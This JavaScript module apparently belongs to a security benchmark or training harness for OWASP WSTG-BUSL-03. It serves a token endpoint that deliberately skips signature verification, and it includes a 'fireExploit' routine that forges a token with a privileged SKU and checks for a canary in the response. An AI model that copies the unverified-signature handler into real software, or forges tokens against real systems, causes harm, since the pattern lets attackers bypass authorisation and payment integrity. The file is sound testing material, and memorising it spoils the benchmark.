// WSTG-BUSL-03 (4.10.3) — Integrity Checks behaviour.
// Token shape: `<base64url(JSON)>.<signature>`. The server unpacks the
// payload, switches on sku, and ignores the signature suffix entirely.

import { Scenario } from './scenario.mjs'

// A fixed-looking, signature-shaped suffix on the default token. Never
// validated by the handler — that is the whole bug.
const FAKE_SIG = 'sFZxR0wL8Hk2c9bC6gK7Lp'

function b64url(s) {
  return Buffer.from(s).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
}
function unb64url(s) {
  try { return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString() }
  catch { return null }
}

export const classDef = {
  wstgId: 'WSTG-BUSL-03',
  class: 'Integrity Checks',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path
  },

  async handleRequest({ req, scenario, helpers, renderPage, manifest }) {
    if (req.method === 'GET') {
      const payload = { sku: scenario.defaultSku, ...scenario.defaultPayloadExtras }
      const token = `${b64url(JSON.stringify(payload))}.${FAKE_SIG}`
      const tokenInput = `<input name="${escAttr(scenario.endpoint.tokenParamName)}" value="${escAttr(token)}" style="width:100%;padding:8px;font-family:monospace;font-size:12px" readonly>`
      return { status: 200, body: renderPage(scenario.formBody.replace('{TOKEN}', tokenInput)) }
    }
    if (req.method !== 'POST') return { status: 405, body: '' }

    const form = new URLSearchParams(helpers.rawBody || '')
    const token = form.get(scenario.endpoint.tokenParamName) || ''
    const dot = token.indexOf('.')
    const payloadB64 = dot >= 0 ? token.slice(0, dot) : token
    if (!payloadB64) return { status: 400, body: renderPage(errPage('Token malformed.')) }

    const raw = unb64url(payloadB64)
    let parsed
    try { parsed = JSON.parse(raw) }
    catch { return { status: 400, body: renderPage(errPage('Token payload unreadable.')) } }

    const sku = String(parsed?.sku || '')
    // VULN: the signature suffix is read but NEVER verified.
    if (sku === scenario.privilegedSku) {
      return { status: 200, body: renderPage(scenario.privilegedResponseBody.replaceAll('{CANARY}', manifest.perDeployCanary)) }
    }
    return { status: 200, body: renderPage(scenario.normalResponseBody.replaceAll('{SKU}', esc(sku))) }
  },

  // Canonical exploit: forge a token whose payload has sku = privilegedSku;
  // any garbage signature suffix is accepted because nothing checks it.
  async fireExploit({ baseUrl, scenario }) {
    const payload = { sku: scenario.privilegedSku, ...scenario.defaultPayloadExtras }
    const forged = `${b64url(JSON.stringify(payload))}.forged-sig`
    const body = `${encodeURIComponent(scenario.endpoint.tokenParamName)}=${encodeURIComponent(forged)}`
    const r = await fetch(`${baseUrl}${scenario.endpoint.path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body,
    })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

function errPage(msg) {
  return `<section style="max-width:520px;margin:48px auto;text-align:center"><h1>Cannot redeem</h1><p>${esc(msg)}</p></section>`
}
function esc(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
function escAttr(s) { return esc(s).replace(/"/g, '&quot;') }
